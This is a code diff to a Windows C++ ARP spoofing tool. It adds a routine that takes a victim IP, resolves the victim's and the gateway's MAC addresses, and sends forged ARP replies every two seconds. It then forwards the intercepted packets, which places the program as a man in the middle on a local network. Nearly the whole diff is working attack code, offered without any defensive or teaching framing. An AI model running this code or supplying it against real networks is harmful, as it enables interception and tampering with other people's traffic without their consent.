@@ -2,6 +2,16 @@
 
 #include "arpspoof.h"
 
+std::atomic<bool> stop;
+
+BOOL WINAPI CtrlCHandler(DWORD dwCtrlType) {
+	if (dwCtrlType == CTRL_C_EVENT) {
+		stop = true;
+		return TRUE;
+	}
+	return FALSE;
+}
+
 std::string Arpspoof::unicode_to_str(wchar_t *unistr) {
 	char buf[100];
 	int res = WideCharToMultiByte(CP_ACP, 0, unistr, wcslen(unistr), buf, 100, NULL, NULL);
@@ -189,4 +199,138 @@ void Arpspoof::handle_packet(pcap_t *pcap, pcap_pkthdr *header, const uint8_t *d
 		fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(pcap));
 		return;
 	}
+}
+
+
+int Arpspoof::SendArpReplayForSpoofing(bool &retflag)
+{
+	retflag = true;
+	std::string victim, target;
+	std::cout << "Please enter a valid ip of victim\n>";
+	std::cin >> victim;
+
+	uint8_t victimip[4], targetip[4] = { 0 };
+	{
+		uint32_t a = inet_addr(victim.c_str());
+		memcpy(victimip, &a, 4);
+	}
+
+	std::string ifacestr;
+	std::vector<iface_info> ifaces = find_ifaces();
+	int ifaceidx = -1;
+	if (ifacestr.empty()) {
+		// Find iface with address/netmask matching given victim
+		int i = 0;
+		for (const iface_info& iface : ifaces) {
+			uint32_t ip = (iface.ip[0] << 24) | (iface.ip[1] << 16) | (iface.ip[2] << 8) | iface.ip[3];
+			uint32_t ipnet = ip & ~((1 << (32 - iface.prefixlen)) - 1);
+			uint32_t vic = (victimip[0] << 24) | (victimip[1] << 16) | (victimip[2] << 8) | victimip[3];
+			uint32_t vicnet = vic & ~((1 << (32 - iface.prefixlen)) - 1);
+			if (ip != 0 && ipnet == vicnet) {
+				if (ifaceidx == -1) {
+					ifaceidx = i;
+				}
+				else {
+					fprintf(stderr, "Several interfaces match victim IP, use -i");
+					return 1;
+				}
+			}
+			i++;
+		}
+	}
+	else {
+		// ifacestr is interface index or name
+		int index = atoi(ifacestr.c_str());
+		if (index == 0) {
+			int i = 0;
+			for (const iface_info& iface : ifaces) {
+				if (iface.name == ifacestr) {
+					ifaceidx = i;
+					break;
+				}
+				i++;
+			}
+		}
+		else {
+			ifaceidx = index;
+		}
+	}
+	if (ifaceidx < 0 || ifaceidx >= (int)ifaces.size()) {
+		fprintf(stderr, "Can't find interface (explicitly specified or matching victim IP)\n");
+		return 1;
+	}
+	const iface_info& iface = ifaces[ifaceidx];
+	if (target.empty()) {
+		memcpy(targetip, iface.gateway, 4);
+	}
+
+	printf("Resolving victim and target...\n");
+
+	uint8_t victimmac[6], targetmac[6];
+	if (!resolve(iface, victimip, victimmac)) {
+		fprintf(stderr, "Can't resolve victim IP, is it up?\n");
+		return 1;
+	}
+	if (!resolve(iface, targetip, targetmac)) {
+		fprintf(stderr, "Can't resolve target IP, is it up?\n");
+		return 1;
+	}
+
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t *pcap = pcap_open_live(iface.name.c_str(),		// name of the device
+		65536,			// snaplen
+		1,				// promiscuous mode (nonzero means promiscuous)
+		1000,			// read timeout
+		errbuf			// error buffer
+	);
+	if (pcap == NULL) {
+		fprintf(stderr, "Unable to open the adapter. %s is not supported by WinPcap\n", iface.name.c_str());
+		return 1;
+	}
+	/* Check the link layer. We support only Ethernet for simplicity. */
+	if (pcap_datalink(pcap) != DLT_EN10MB)
+	{
+		fprintf(stderr, "This program works only on Ethernet networks.\n");
+		return 1;
+	}
+
+	SetConsoleCtrlHandler(CtrlCHandler, TRUE);
+
+	uint8_t arp_spoof_victim[42], arp_spoof_target[42];
+	fill_arp_packet(arp_spoof_victim, victimip, victimmac, targetip, iface.mac);
+	fill_arp_packet(arp_spoof_target, targetip, targetmac, victimip, iface.mac);
+
+	printf("Redirecting %s (%s) ---> %s (%s)\n", ip_to_str(victimip).c_str(), mac_to_str(victimmac).c_str(),
+		ip_to_str(targetip).c_str(), mac_to_str(targetmac).c_str());
+
+	time_t next_arp_time = 0;
+	while (!stop) {
+		time_t now = time(nullptr);
+		if (now >= next_arp_time) {
+			next_arp_time = now + 2;
+			if (pcap_sendpacket(pcap, arp_spoof_victim, sizeof(arp_spoof_victim)) != 0) {
+				fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
+				return 1;
+			}
+			if (pcap_sendpacket(pcap, arp_spoof_target, sizeof(arp_spoof_target)) != 0) {
+				fprintf(stderr, "Error sending packet2: %s\n", pcap_geterr(pcap));
+				return 1;
+			}
+		}
+
+		pcap_pkthdr *header;
+		const uint8_t *pkt_data;
+		int res = pcap_next_ex(pcap, &header, &pkt_data);
+		if (res < 0) {
+			printf("error\n");
+			break;
+		}
+		else if (res == 0) {
+			// timeout
+			continue;
+		}
+		handle_packet(pcap, header, pkt_data, victimmac, victimip, targetmac, iface.mac);
+	}
+	retflag = false;
+	return {};
 }
